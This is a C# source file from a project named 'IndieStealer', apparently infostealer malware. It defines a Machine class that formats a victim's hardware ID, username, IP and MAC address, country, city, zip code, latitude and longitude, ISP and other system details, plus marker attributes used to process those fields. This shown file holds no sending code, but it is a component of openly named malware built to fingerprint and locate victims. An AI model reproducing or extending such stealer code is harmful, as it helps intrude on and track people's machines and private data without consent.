using System;
using System.Collections.Generic;
using System.ComponentModel.DataAnnotations;
using System.Windows.Forms.VisualStyles;

namespace IndieStealer.Collect.System
{
    [SplitValidation]
    [NameValidation]
    class Machine
    {
        private string _osVersion;
        private string _cpu;
        private string _gpu;
        private string _ram;
        private string _screenResolution;
        private string _machineName;
        private string _hwid;
        private string _username;
        private string _ipAddress;
        private string _macAddress;
        private string _country;
        private string _city;
        private string _zip;
        private string _lat;
        private string _lon;
        private string _isp;
        private string _currentDate;
        private string _systemLanguage;
        private string _filePath;
        private string _processesCount;

        [NameValidation]
        public string Title { get; set; }
        
        [SplitValidation]
        [NameValidation]
        
        public string osVersion
        {
            get => "OS: " + _osVersion;
            set => _osVersion = value;
        }
        [NameValidation]
        
        public string CPU
        {
            get => "CPU: " + _cpu;
            set => _cpu = value;
        }
        [NameValidation]
        
        public string GPU
        {
            get => "GPU: " + _gpu;
            set => _gpu = value;
        }
        [NameValidation]
        
        public string RAM
        {
            get => "Ram: " + _ram;
            set => _ram = value;
        }
        [NameValidation]
        
        public string screenResolution
        {
            get => "Screen Resolution: " + _screenResolution;
            set => _screenResolution = value;
        }
        [NameValidation]
        
        public string machineName
        {
            get => "Machine Name: " + _machineName;
            set => _machineName = value;
        }
        [NameValidation]
        
        public string HWID
        {
            get =>  "HW-ID: " + _hwid;
            set => _hwid = value;
        }
        [NameValidation]
        
        public string Username
        {
            get => "User Name: " + _username;
            set => _username = value;
        }
        [SplitValidation]
        [NameValidation]
        
        public string ipAddress
        {
            get => "IP Address: " + _ipAddress;
            set => _ipAddress = value;
        }
        [NameValidation]
        
        public string macAddress
        {
            get => "Mac Address: " + _macAddress;
            set => _macAddress = value;
        }
        [NameValidation]
        
        public string Country
        {
            get => "Country: " + _country;
            set => _country = value;
        }
        [NameValidation]
        
        public string City
        {
            get => "City: " + _city;
            set => _city = value;
        }
        [NameValidation]
        
        public string Zip
        {
            get => "Zipcode: " + _zip;
            set => _zip = value;
        }
        [NameValidation]
        
        public string Lat
        {
            get => "Lat: " + _lat;
            set => _lat = value;
        }
        [NameValidation]
        
        public string Lon
        {
            get => "Lon: " + _lon;
            set => _lon = value;
        }
        [NameValidation]
        
        public string ISP
        {
            get => "ISP: " + _isp;
            set => _isp = value;
        }
        [SplitValidation]
        [NameValidation]
        
        public string currentDate
        {
            get => "Current Date: " + _currentDate;
            set => _currentDate = value;
        }
        [NameValidation]
        
        public string systemLanguage
        {
            get => "System Language: " + _systemLanguage;
            set => _systemLanguage = value;
        }
        
        [NameValidation]
        
        public string filePath
        {
            get => "File Path: " + _filePath;
            set => _filePath = value;
        }
        [NameValidation]
        
        public string processesCount
        {
            get => "Processes Count: " + _processesCount;
            set => _processesCount = value;
        }
        
    }
    [AttributeUsage(AttributeTargets.Class | AttributeTargets.Property, AllowMultiple = true)]
    public class NameValidationAttribute : Attribute
    {
        public NameValidationAttribute() { }
    }
    [AttributeUsage(AttributeTargets.Class | AttributeTargets.Property, AllowMultiple = true)]
    public class SplitValidationAttribute : Attribute
    {
        public SplitValidationAttribute() { }
    }
    [AttributeUsage(AttributeTargets.Class| AttributeTargets.Method, AllowMultiple = true)]
    public class ExecuteValidationAttribute : Attribute
    {
        public ExecuteValidationAttribute() { }
    }
}